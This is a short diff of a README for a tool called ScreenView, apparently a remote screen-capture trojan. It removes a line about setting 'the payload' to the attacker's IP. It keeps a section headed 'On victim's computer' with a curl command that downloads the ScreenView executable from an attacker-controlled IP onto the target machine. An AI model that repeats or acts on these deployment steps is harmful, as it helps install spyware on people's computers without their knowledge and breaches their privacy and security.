@@ -22,8 +22,6 @@ $ pip3 install -r requirements.txt
 ```
 
 ## Usage
-### ScreenView.py
-This module can run on Linux, Windows, and MacOS. To configure the payload go to line 32 and replace IP with your IP.
 ### On victim's computer
 ```
 $ curl http://IP/ScreenView/ScreenView.(exe, app, etc) --output ScreenView.(exe, app, etc)
